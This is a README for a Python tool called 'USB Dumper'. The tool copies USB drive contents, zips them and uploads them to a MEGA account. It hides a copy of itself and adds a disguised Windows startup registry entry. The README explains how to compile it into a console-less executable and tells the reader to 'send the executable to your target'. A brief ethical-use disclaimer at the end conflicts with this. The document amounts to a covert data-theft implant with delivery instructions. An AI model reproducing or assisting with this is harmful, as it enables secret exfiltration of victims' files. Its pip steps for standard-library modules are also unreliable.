# USB Dumper Script

This Python script monitors USB drives connected to your computer, copies their contents, zips them, and uploads them to your MEGA cloud storage. It also ensures the script runs automatically every time your computer starts.

---

## Features

- **USB Monitoring:** Continuously checks for connected USB drives.
- **Automatic Backup:** Copies and zips USB contents to a local folder.
- **Cloud Upload:** Uploads the zipped files to your MEGA account.
- **Persistence:** Runs automatically at startup.

---

## Prerequisites

- Python 3.x installed on your system.
- A MEGA account for cloud storage.

---

## Installation

1. **Install Python:**
   - Download and install Python from [python.org](https://www.python.org/downloads/).
   - Ensure you check the box to **"Add Python to PATH"** during installation.

2. **Install Required Libraries:**
   Open a terminal or command prompt and run the following commands:

   ```bash
   pip install mega.py
   pip install shutil
   pip install zipfile
   pip install subprocess
   pip install sys
   ```

---

## Configuration

1. **Set Up MEGA Credentials:**
   - Open the script in a text editor.
   - Locate the following lines near the top of the script:

     ```python
     # MEGA credentials
     MEGA_EMAIL = "email@email.com"  # Replace with your MEGA email
     MEGA_PASSWORD = "password123"  # Replace with your MEGA password
     ```

   - Replace the email and password with your own MEGA account credentials.

2. **Save the Script:**
   - Save the script as `usb_dumper.py` on your computer.

---

## Usage

1. **Run the Script:**
   - Open a terminal or command prompt.
   - Navigate to the folder where the script is saved. For example, if it's on your Desktop, run:

     ```bash
     cd Desktop
     ```

   - Run the script:

     ```bash
     python usb_dumper.py
     ```

2. **What Happens Next:**
   - The script will copy itself to a hidden location and add itself to the Windows startup registry.
   - It will continuously monitor USB drives (except `C:\` and `D:\`).
   - If changes are detected on a USB drive, it will copy the contents, zip them, and upload the zip file to your MEGA account in the `usb_captures` folder.

---

## Converting Script into a Binary Executable

To convert the Python script into a standalone executable file, follow these steps:

1. **Save the Folder on Desktop and Extract It:**
   - Save the `Usb_Dumper` folder on your Desktop and extract its contents.

2. **Open Terminal and Run Commands:**
   - Open a terminal or command prompt and navigate to the `Usb_Dumper` folder:

     ```bash
     cd Desktop
     cd Usb_Dumper
     ```

   - Run the following command to convert the script into an executable:

     ```bash
     pyinstaller usb_dumper.py --onefile --noconsole --icon icon.ico
     ```

   - This will create a standalone executable file.

3. **Locate the Executable:**
   - The executable file will be located in the `dist` folder:
     ```
     Desktop/Usb_Dumper/dist/usb_dumper.exe
     ```

4. **Send the Executable to Your Target:**
   - You can now send the `usb_dumper.exe` file to your target. When they run it, the script will execute and perform its functions.

---

## Stopping the Script

1. **Remove from Startup:**
   - Open a command prompt and run:

     ```bash
     reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc_template /f
     ```

2. **Delete the Executable:**
   - Navigate to `AppData\Microsoft\Windows\Themes` and delete the file `svc_template1.exe`.

---

## Checking Uploads

1. **Log in to MEGA:**
   - Go to [MEGA](https://mega.nz/) and log in with your credentials.

2. **Navigate to `usb_captures`:**
   - You should see zip files containing the contents of any USB drives that were connected to your computer.

---

## Troubleshooting

- **Script Doesn’t Run:**
  - Ensure Python is installed and added to PATH.
  - Verify all required libraries are installed.
  - Double-check your MEGA credentials.

- **Upload Fails:**
  - Check your internet connection.
  - Ensure your MEGA account has enough storage space.

- **USB Not Detected:**
  - Make sure the USB drive is properly connected.
  - Check if the drive letter is excluded in the `EXCLUDED_DRIVES` list in the script.

---

## Important Notes

- **Ethical Use:** Only use this script on devices you own or have explicit permission to monitor. Unauthorized use may violate privacy laws.
- **Security:** Avoid sharing your MEGA credentials or the script with others.
- **Persistence:** The script is designed to run automatically at startup. If you don’t want this behavior, remove the `become_good()` function call in the script.



---

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

---

## Support

If you have any questions or need help, feel free to open an issue on GitHub.

---

Happy monitoring! 🚀
